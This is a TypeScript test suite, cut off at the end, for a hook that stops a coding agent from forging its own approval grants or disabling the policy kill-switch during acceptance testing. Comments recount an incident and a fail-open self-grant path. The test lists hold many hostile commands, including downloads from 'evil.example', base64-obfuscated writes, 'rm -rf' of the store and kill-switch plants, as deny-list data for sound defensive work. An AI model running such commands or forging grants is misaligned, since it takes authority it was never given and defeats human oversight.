/**
 * Incident-sequence regression for #2944 Wave 1.
 *
 * Reproduce: active UAT → agent treats triage/swarm language as implement authority
 * → first unauthorized product edit is blocked.
 */

import { describe, expect, it } from "vitest";
import { decideHook, type HookPolicySeams } from "../hooks/dispatcher.js";
import type { VerifyResult } from "../session/verify-session-ritual.js";
import { evaluateAuthzMutation } from "./evaluate.js";
import { evidenceSatisfiesImplementationApproval } from "./origin.js";
import type { AuthzState, HumanOriginGrant, UatLease } from "./types.js";

const readyRitual: VerifyResult = {
  code: 0,
  message: "OK session ritual gated tier is fresh.",
  tier: "gated",
  statePath: "/project/.deft/ritual-state.json",
  bypassed: false,
  wouldFailCode: null,
  posture: "mutation",
  ritualStateRequired: true,
};

function readySeams(overrides: Partial<HookPolicySeams> = {}): HookPolicySeams {
  return {
    inspectRitual: () => readyRitual,
    inspectScope: () => ({
      ready: true,
      path: "xbrief/active/story.xbrief.json",
      message: "active scope ready",
    }),
    authzAudit: false,
    ...overrides,
  };
}

function activeUatState(): AuthzState {
  const lease: UatLease = {
    active: true,
    campaignId: "uat-incident-2026",
    startedAt: "2026-07-30T00:00:00Z",
    startedBy: {
      kind: "operator-cli",
      actor: "operator",
      mintedAt: "2026-07-30T00:00:00Z",
      mintedVia: "deft authz:uat-start",
      eventRef: null,
    },
    suspendedAt: null,
    note: "full UAT + defect capture",
  };
  return { schemaVersion: 1, uat: lease, activeGrantIds: [] };
}

const selfMintedFromDispatch: HumanOriginGrant = {
  schemaVersion: 1,
  id: "agent-minted",
  origin: {
    kind: "dispatch-envelope",
    actor: "agent",
    mintedAt: "2026-07-30T01:00:00Z",
    mintedVia: "allocation_context free-text",
    eventRef: null,
  },
  scope: {
    planRef: null,
    repo: null,
    branch: null,
    worktree: null,
    surfaces: ["**/*"],
    operations: ["edit", "push", "pr", "merge"],
    storyIds: [],
    issueIds: [],
    cohortId: "swarmed-defects",
  },
  semantics: { expiresAt: null, singleUse: false, usedAt: null, revokedAt: null },
};

describe("incident sequence regression (#2944)", () => {
  it("1–3: operator UAT + swarm language does not mint implement approval", () => {
    // Agent-advanced lifecycle / allocation_context is not human-origin approval.
    expect(
      evidenceSatisfiesImplementationApproval({
        xbriefStatus: "running",
        allocationContext: {
          dispatch_kind: "swarm-cohort",
          allocation_plan_id: "plan-x",
          batching_rationale: "operator said swarm these defects",
        },
        lifecycleAdvancedBy: "agent",
      }),
    ).toBe(false);
    expect(evidenceSatisfiesImplementationApproval({ grant: selfMintedFromDispatch })).toBe(false);
  });

  it("4: first unauthorized product/UI edit is blocked under active UAT", () => {
    const state = activeUatState();
    // Pure evaluate path
    const pure = evaluateAuthzMutation({
      state,
      grants: [selfMintedFromDispatch],
      op: "edit",
      path: "apps/web/src/components/Header.tsx",
    });
    expect(pure.allowed).toBe(false);
    expect(pure.reason).toMatch(/Human action required|self-authored|origin/i);

    // PreToolUse decideHook path (enforcement before execution)
    const decision = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Write",
          tool_input: {
            file_path: "/project/apps/web/src/components/Header.tsx",
            content: "/* unauthorized UI change */",
          },
        },
      },
      readySeams({
        loadAuthzState: () => state,
        // Even if the agent wrote a self-minted grant file, filter like production store:
        loadAuthzGrants: () => [],
      }),
    );
    expect(decision.verdict).toBe("deny");
    expect(decision.code).toMatch(/^authz-/);
    expect(decision.message).toMatch(/UAT|Human action required|authz:grant/i);
  });

  it("5: continuation language does not unlock push/PR/merge under UAT", () => {
    const state = activeUatState();
    const seams = readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });

    for (const command of ["git push origin HEAD", "gh pr create --title t", "gh pr merge 1"]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
    }
  });

  it("still allows test execution and issue filing during UAT", () => {
    const state = activeUatState();
    const seams = readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: false, merge: false },
      }),
    });

    const testRun = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: { tool_name: "Bash", tool_input: { command: "pnpm test" } },
      },
      seams,
    );
    expect(testRun.verdict).toBe("allow");

    const issue = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: { command: "gh issue create --title 'UAT defect' --body 'repro'" },
        },
      },
      seams,
    );
    expect(issue.verdict).toBe("allow");
  });
});

describe("CLI self-mint via shell under UAT (#3110)", () => {
  /**
   * Residual AppSec path: classifyShellAuthzOps returned [] for authz:grant →
   * shell-op-unclassifiable fail-open → silent operator-cli mint → empty activeGrantIds
   * activated the grant → Write/push unlocked. Dispatch-envelope self-mint is covered above;
   * this suite covers the CLI/shell mint path.
   */
  it("Bash/Shell authz:grant under UAT is denied (settings), not shell-op-unclassifiable allow", () => {
    const state = activeUatState(); // activeGrantIds: []
    const seams = readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });

    for (const command of [
      "deft authz:grant -- --operations edit,push,pr,merge --cohort self --surfaces '**/*'",
      "task authz:grant -- --operations edit --cohort self",
      "deft authz:uat-suspend",
      "deft authz:uat-start -- --campaign forged",
      "deft authz:revoke -- grant-anything",
    ]) {
      for (const tool_name of ["Bash", "Shell"]) {
        const decision = decideHook(
          {
            host: "claude",
            event: "tool.before",
            projectRoot: "/project",
            payload: { tool_name, tool_input: { command } },
          },
          seams,
        );
        expect(decision.verdict, `${tool_name} ${command}`).toBe("deny");
        expect(decision.code, `${tool_name} ${command}`).toMatch(/^authz-/);
        expect(decision.code, `${tool_name} ${command}`).not.toBe("shell-op-unclassifiable");
      }
    }
  });

  it("shell write under .deft/authz/ is denied under UAT", () => {
    const state = activeUatState();
    const seams = readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });

    for (const command of [
      'echo {"schemaVersion":1} > .deft/authz/grants/evil.json',
      "cp /tmp/grant.json .deft/authz/grants/evil.json",
      "echo '{}' > \"$AUTHZ_DIR/state.json\"",
      "printf '{}' > \"$STORE\"",
      'cp /tmp/evil.json "$(echo .deft)/authz/state.json"',
      "rm -rf $STORE",
      "cd .deft && echo x > authz/state.json",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
    }
  });

  it("after denied authz:grant shell, Write and push remain locked (empty activeGrantIds)", () => {
    const state = activeUatState();
    const seams = readySeams({
      loadAuthzState: () => state,
      // Production store filters self-authored; agent never successfully minted.
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });

    const grantAttempt = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: {
            command:
              "deft authz:grant -- --operations edit,push,pr,merge --cohort self --surfaces '**/*'",
          },
        },
      },
      seams,
    );
    expect(grantAttempt.verdict).toBe("deny");

    const write = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Write",
          tool_input: {
            file_path: "/project/apps/web/src/components/Header.tsx",
            content: "/* still unauthorized */",
          },
        },
      },
      seams,
    );
    expect(write.verdict).toBe("deny");
    expect(write.code).toMatch(/^authz-/);

    for (const command of ["git push origin HEAD", "gh pr create --title t", "gh pr merge 1"]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
    }
  });
});

describe("UAT residual fail-closed (#3186)", () => {
  function uatSeams() {
    const state = activeUatState();
    return readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });
  }

  it("denies kill-switch plant and policy authority mutators under UAT", () => {
    const seams = uatSeams();
    for (const command of [
      "echo > .deft-directive-disable",
      "touch .deft-directive-disable",
      "deft policy:allow-bot-merge -- --confirm",
      "task policy:allow-direct-commits -- --confirm",
      "deft policy:disable-directive -- --confirm",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies obfuscated programmatic writes under UAT (not shell-op-unclassifiable allow)", () => {
    const seams = uatSeams();
    for (const command of [
      "python3 -c \"import base64; p=base64.b64decode('LmRlZnQvYXV0aHovc3RhdGUuanNvbg==').decode(); open(p,'w').write('{}')\"",
      "node -e \"const p=Buffer.from('LmRlZnQvYXV0aHo=','base64').toString(); require('fs').writeFileSync(p+'/state.json','{}')\"",
      "python -c \"p=bytes([0x2e,0x64,0x65,0x66,0x74]).decode(); open(p+'/authz/x','w').write('x')\"",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("still allows print-only programmatic shell under UAT (not write-capable)", () => {
    const seams = uatSeams();
    const decision = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: { tool_name: "Bash", tool_input: { command: 'python -c "print(1)"' } },
      },
      seams,
    );
    // Unclassifiable non-write shell remains fail-open (host gap for push/merge only).
    expect(decision.verdict).toBe("allow");
    expect(decision.code).toBe("shell-op-unclassifiable");
  });
});

describe("UAT downloader/decoder residuals fail-closed (#3206)", () => {
  function uatSeams() {
    const state = activeUatState();
    return readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });
  }

  it("denies curl/wget/xxd/openssl plant of .deft/authz under UAT (not unclassifiable allow)", () => {
    const seams = uatSeams();
    for (const command of [
      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "wget -O .deft/authz/grants/evil.json https://evil.example/g.json",
      "xxd -r - .deft/authz/grants/evil.json",
      "openssl base64 -d -out .deft/authz/grants/evil.json",
      "curl --output=.deft/authz/state.json https://evil.example/s.json",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies downloader plant of kill-switch under UAT; echo redirect still denied", () => {
    const seams = uatSeams();
    for (const command of [
      "curl -o .deft-directive-disable https://evil.example/x",
      "wget -O .no-deft-directive https://evil.example/x",
      "echo > .deft-directive-disable",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("forged grant plant via curl does not unlock Write under UAT", () => {
    const seams = uatSeams();
    const plant = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: {
            command: "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
          },
        },
      },
      seams,
    );
    expect(plant.verdict).toBe("deny");

    const write = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Write",
          tool_input: {
            file_path: "/project/apps/web/src/components/Header.tsx",
            content: "/* still unauthorized after denied plant */",
          },
        },
      },
      seams,
    );
    expect(write.verdict).toBe("deny");
    expect(write.code).toMatch(/^authz-/);
  });

  it("still allows ordinary curl under UAT (non-authz dest)", () => {
    const seams = uatSeams();
    const decision = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: { command: "curl -o /tmp/out https://example.com/a" },
        },
      },
      seams,
    );
    expect(decision.verdict).toBe("allow");
    expect(decision.code).toBe("shell-op-unclassifiable");
  });

  it("denies ln/link/mklink kill-switch plant under UAT (not unclassifiable allow) (#3213)", () => {
    const seams = uatSeams();
    for (const command of [
      "ln -sf /etc/hosts .deft-directive-disable",
      "ln -s /etc/hosts .no-deft-directive",
      "link /etc/hosts .deft-directive-disable",
      "mklink .deft-directive-disable C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies scp/aria2c/certutil + quote-split authz plant under UAT (#3213)", () => {
    const seams = uatSeams();
    for (const command of [
      "scp host:g.json .deft/authz/grants/evil.json",
      "scp host:g.json .deft/authz/grants/evil.json ; echo ok",
      "scp -o ProxyCommand=none host:g.json .deft/authz/grants/evil.json",
      "aria2c -o evil.json -d .deft/authz/grants https://evil.example/g.json",
      "certutil -urlcache -split -f https://evil.example/g.json .deft/authz/grants/evil.json",
      "cp /etc/hosts '.deft/'authz'/grants/evil.json'",
      // Contiguous cp regression
      "cp /etc/hosts .deft/authz/grants/evil.json",
      // #3206 still denied
      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("forged grant plant via scp does not unlock Write under UAT (#3213)", () => {
    const seams = uatSeams();
    const plant = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: {
            command: "scp host:g.json .deft/authz/grants/evil.json",
          },
        },
      },
      seams,
    );
    expect(plant.verdict).toBe("deny");

    const write = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Write",
          tool_input: {
            file_path: "/project/apps/web/src/components/Header.tsx",
            content: "/* still unauthorized after denied scp plant */",
          },
        },
      },
      seams,
    );
    expect(write.verdict).toBe("deny");
    expect(write.code).toMatch(/^authz-/);
  });

  it("denies archive/alt-downloader authz plant under UAT (not unclassifiable allow) (#3245)", () => {
    const seams = uatSeams();
    for (const command of [
      "tar -xf archive.tar -C .deft/authz/grants",
      "unzip -d .deft/authz/grants a.zip",
      "rclone copy remote:x .deft/authz/grants/",
      "axel -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "fetch -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "socat - OPEN:.deft/authz/grants/evil.json",
      "7z x a.7z -o.deft/authz/grants",
      "bsdtar -xf a.tar -C .deft/authz/grants",
      "lftp -e get x -o .deft/authz/grants/x",
      // #3206 / #3213 still denied
      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "scp host:g.json .deft/authz/grants/evil.json",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies archive/alt-downloader kill-switch plant under UAT (#3245)", () => {
    const seams = uatSeams();
    for (const command of [
      "axel -o .deft-directive-disable https://evil.example/x",
      "fetch -o .deft-directive-disable https://evil.example/x",
      "rclone copy remote:x .deft-directive-disable",
      "socat - OPEN:.deft-directive-disable",
      "tar -xf a.tar .deft-directive-disable",
      "7z x a.7z -o.no-deft-directive",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("forged grant plant via tar does not unlock Write under UAT (#3245)", () => {
    const seams = uatSeams();
    const plant = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: {
            command: "tar -xf archive.tar -C .deft/authz/grants",
          },
        },
      },
      seams,
    );
    expect(plant.verdict).toBe("deny");

    const write = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Write",
          tool_input: {
            file_path: "/project/apps/web/src/components/Header.tsx",
            content: "/* still unauthorized after denied tar plant */",
          },
        },
      },
      seams,
    );
    expect(write.verdict).toBe("deny");
    expect(write.code).toMatch(/^authz-/);
  });

  it("still allows ordinary tar extract under UAT (non-authz dest) (#3245)", () => {
    const seams = uatSeams();
    const decision = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: { command: "tar -xf archive.tar -C /tmp/out" },
        },
      },
      seams,
    );
    expect(decision.verdict).toBe("allow");
    expect(decision.code).toBe("shell-op-unclassifiable");
  });

  it("denies crypto/alt-download residual authz plant under UAT (not unclassifiable allow) (#3288)", () => {
    const seams = uatSeams();
    for (const command of [
      "gpg -o .deft/authz/grants/evil.json -d secret.gpg",
      "age -o .deft/authz/grants/evil.json -d secret.age",
      "zstd -o .deft/authz/grants/evil.json -d a.zst",
      "sftp host:g.json .deft/authz/grants/evil.json",
      "wget2 -O .deft/authz/grants/evil.json https://evil.example/g.json",
      "http -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "yt-dlp -o .deft/authz/grants/evil.json https://evil.example/v",
      "aria2 -o evil.json -d .deft/authz/grants https://evil.example/g.json",
      "mbuffer -i in.bin -o .deft/authz/grants/evil.json",
      "cpio -id -D .deft/authz/grants",
      // prior residuals stay denied
      "tar -xf archive.tar -C .deft/authz/grants",
      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies crypto/alt-download residual kill-switch plant under UAT (#3288)", () => {
    const seams = uatSeams();
    for (const command of [
      "gpg -o .deft-directive-disable -d secret.gpg",
      "age -o .deft-directive-disable -d secret.age",
      "zstd -o .deft-directive-disable -d a.zst",
      "yt-dlp -o .deft-directive-disable https://evil.example/v",
      "wget2 -O .no-deft-directive https://evil.example/x",
      "http -o .deft-directive-disable https://evil.example/x",
      "mbuffer -i in.bin -o .deft-directive-disable",
      "cpio -id -D .deft-directive-disable",
      "sftp host:.deft-directive-disable",
      "aria2 -o .deft-directive-disable https://evil.example/x",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("forged grant plant via gpg does not unlock Write under UAT (#3288)", () => {
    const seams = uatSeams();
    const plant = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: {
            command: "gpg -o .deft/authz/grants/evil.json -d secret.gpg",
          },
        },
      },
      seams,
    );
    expect(plant.verdict).toBe("deny");

    const write = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Write",
          tool_input: {
            file_path: "/project/apps/web/src/components/Header.tsx",
            content: "/* still unauthorized after denied gpg plant */",
          },
        },
      },
      seams,
    );
    expect(write.verdict).toBe("deny");
    expect(write.code).toMatch(/^authz-/);
  });

  it("still allows ordinary residual-bin dest under UAT (non-authz) (#3288)", () => {
    const seams = uatSeams();
    for (const command of [
      "gpg -o /tmp/out.json -d secret.gpg",
      "zstd -o /tmp/out -d a.zst",
      "cpio -id -D /tmp/out",
      "yt-dlp -o /tmp/out https://example.com/v",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: {
            tool_name: "Bash",
            tool_input: { command },
          },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("allow");
      expect(decision.code, command).toBe("shell-op-unclassifiable");
    }
  });

  it("denies residual writer authz plant under UAT (not unclassifiable allow) (#3354)", () => {
    const seams = uatSeams();
    for (const command of [
      "nc -o .deft/authz/grants/evil.json evil.example 80",
      "netcat -o .deft/authz/grants/evil.json evil.example 80",
      "7zz x a.7z -o.deft/authz/grants",
      "msgfmt -o .deft/authz/grants/evil.json messages.po",
      "msgcat -o .deft/authz/grants/evil.json a.po",
      "lz4 -o .deft/authz/grants/evil.json a.lz4",
      "lzop --output .deft/authz/grants/evil.json a.lzo",
      "unrar x archive.rar .deft/authz/grants",
      "aunpack -X .deft/authz/grants archive.tar",
      "ftpget evil.example .deft/authz/grants/evil.json remote.json",
      "sqlite3 db.sqlite .output .deft/authz/grants/evil.json",
      "crane pull ghcr.io/evil/g:latest .deft/authz/grants/evil.json",
      "objcopy src.bin .deft/authz/grants/evil.json",
      "weirdbin -o .deft/authz/grants/evil.json",
      // already-denied #3336 peers
      "ncat -o .deft/authz/grants/evil.json evil.example 80",
      "7z x a.7z -o.deft/authz/grants",
      "msguniq -o .deft/authz/grants/evil.json messages.po",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies residual writer kill-switch plant under UAT (#3354)", () => {
    const seams = uatSeams();
    for (const command of [
      "nc -o .deft-directive-disable evil.example 80",
      "7zz x a.7z -o.deft-directive-disable",
      "msgfmt -o .no-deft-directive messages.po",
      "lz4 -o .deft-directive-disable a.lz4",
      "sqlite3 db.sqlite .output .deft-directive-disable",
      "objcopy src.bin .no-deft-directive",
      "unknownwriter --output .deft-directive-disable",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("still allows ordinary residual-bin dest under UAT (non-authz) (#3354)", () => {
    const seams = uatSeams();
    for (const command of [
      "nc -o /tmp/out example.com 80",
      "7zz x a.7z -o/tmp/out",
      "msgfmt -o /tmp/out messages.po",
      "sqlite3 db.sqlite .output /tmp/out",
      "objcopy src.bin /tmp/out",
      "weirdbin -o /tmp/out",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: {
            tool_name: "Bash",
            tool_input: { command },
          },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("allow");
      expect(decision.code, command).toBe("shell-op-unclassifiable");
    }
  });
});

describe("UAT residual dest-form writers fail-closed (#3382)", () => {
  function uatSeams() {
    const state = activeUatState();
    return readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });
  }

  it("denies residual dest-form authz plant under UAT (not unclassifiable allow) (#3382)", () => {
    const seams = uatSeams();
    for (const command of [
      "cmake -E copy src.json .deft/authz/grants/evil.json",
      "script -q .deft/authz/grants/evil",
      "gallery-dl -d .deft/authz/grants https://evil.example/g",
      "megadl --path .deft/authz/grants https://mega.nz/evil",
      "ncftpget evil.example .deft/authz/grants/evil.json remote.json",
      "git apply --directory=.deft/authz/grants p.diff",
      "svn export https://evil.example/repo .deft/authz/grants/evil",
      "fossil open repo.fossil .deft/authz/grants/evil",
      "ed .deft/authz/grants/evil.json",
      "nvim .deft/authz/grants/evil.json",
      "nano .deft/authz/grants/evil.json",
      "unknownwriter --directory .deft/authz/grants",
      // already-denied #3354 peers
      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "nc -o .deft/authz/grants/evil.json evil.example 80",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies residual dest-form kill-switch plant under UAT (#3382)", () => {
    const seams = uatSeams();
    for (const command of [
      "cmake -E copy src .deft-directive-disable",
      "script -q .no-deft-directive",
      "gallery-dl -d .deft-directive-disable https://evil.example/x",
      "megadl --path .deft-directive-disable https://mega.nz/x",
      "ncftpget evil.example .no-deft-directive remote.json",
      "git apply --directory .deft-directive-disable p.diff",
      "svn export https://evil.example/repo .deft-directive-disable",
      "nvim .no-deft-directive",
      "unknownwriter --path=.deft-directive-disable",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("still allows ordinary residual dest-form dest under UAT (non-authz) (#3382)", () => {
    const seams = uatSeams();
    for (const command of [
      "cmake -E copy src.json /tmp/out",
      "script -q /tmp/out",
      "gallery-dl -d /tmp/out https://example.com/a",
      "megadl --path /tmp/out https://mega.nz/a",
      "ncftpget example.com /tmp/out remote.json",
      "git apply --directory /tmp/out p.diff",
      "svn export https://example.com/repo /tmp/out",
      "nvim /tmp/out",
      "unknownwriter --directory /tmp/out",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: {
            tool_name: "Bash",
            tool_input: { command },
          },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("allow");
      expect(decision.code, command).toBe("shell-op-unclassifiable");
    }
  });
});

describe("UAT residual dest-form writers fail-closed (#3421)", () => {
  function uatSeams() {
    const state = activeUatState();
    return readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });
  }

  it("denies residual dest-form authz plant under UAT (not unclassifiable allow) (#3421)", () => {
    const seams = uatSeams();
    for (const command of [
      "git clone https://evil.example/repo .deft/authz/grants/evil",
      "git worktree add .deft/authz/grants/evil HEAD",
      "git --attr-source HEAD clone https://example .deft/authz/grants/evil",
      "git --attr-source log clone https://example .deft/authz/grants/evil",
      "git --unlisted-global log clone https://example .deft/authz/grants/evil",
      "git --shallow-file x clone https://example .deft/authz/grants/evil",
      "git --attr-source HEAD worktree add .deft/authz/grants/evil HEAD",
      "git --shallow-file x submodule add https://example .deft/authz/grants/evil",
      "git submodule add https://evil.example/repo .deft/authz/grants/evil",
      "ex .deft/authz/grants/evil.json",
      "dos2unix -n src.json .deft/authz/grants/evil.json",
      "aws s3 sync s3://evil .deft/authz/grants",
      "aws s3api get-object --bucket b --key k --outfile .deft/authz/grants/evil.json",
      "pijul clone https://evil.example/repo .deft/authz/grants/evil",
      "pg_dump -f .deft/authz/grants/evil.sql db",
      "convert src.json .deft/authz/grants/evil.json",
      "magick src.json .deft/authz/grants/evil.json",
      "mogrify .deft/authz/grants/evil.json",
      "mogrify .deft/authz/x extra.png",
      "fossil --workdir=.deft/authz/grants open repo.fossil",
      "New-Item -Path .deft/authz/grants/evil.json -ItemType File",
      "fallocate -l 1k .deft/authz/grants/evil.json",
      "unknownwriter --workdir=.deft/authz/grants",
